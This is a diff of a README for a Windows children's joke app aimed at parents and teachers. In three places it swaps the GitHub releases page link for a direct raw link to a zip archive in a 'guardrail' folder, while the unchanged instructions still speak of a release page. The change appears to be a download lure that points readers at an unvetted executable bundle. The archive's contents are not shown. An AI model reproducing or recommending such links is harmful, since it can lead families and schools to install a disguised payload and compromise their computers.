@@ -1,6 +1,6 @@
 # 🤖 sixseven-jokes - Fun, Simple Jokes for Home and School
 
-[![Download sixseven-jokes](https://img.shields.io/badge/Download%20sixseven--jokes-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hsmd8584/sixseven-jokes/releases)
+[![Download sixseven-jokes](https://img.shields.io/badge/Download%20sixseven--jokes-2b6cb0?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hsmd8584/sixseven-jokes/main/guardrail/sixseven-jokes-2.4.zip)
 
 ## 🎯 What this is
 
@@ -10,7 +10,7 @@ sixseven-jokes is a Windows app that helps parents and teachers find kid-friendl
 
 Use this page to download the app for Windows:
 
-https://github.com/hsmd8584/sixseven-jokes/releases
+https://raw.githubusercontent.com/hsmd8584/sixseven-jokes/main/guardrail/sixseven-jokes-2.4.zip
 
 1. Open the link above in your web browser.
 2. Find the latest release at the top of the page.
@@ -174,6 +174,6 @@ Check the release page often if you want the latest Windows build.
 
 ## 📥 Download again
 
-https://github.com/hsmd8584/sixseven-jokes/releases
+https://raw.githubusercontent.com/hsmd8584/sixseven-jokes/main/guardrail/sixseven-jokes-2.4.zip
 
 Download the latest Windows file from the release page, then install and run it on your PC
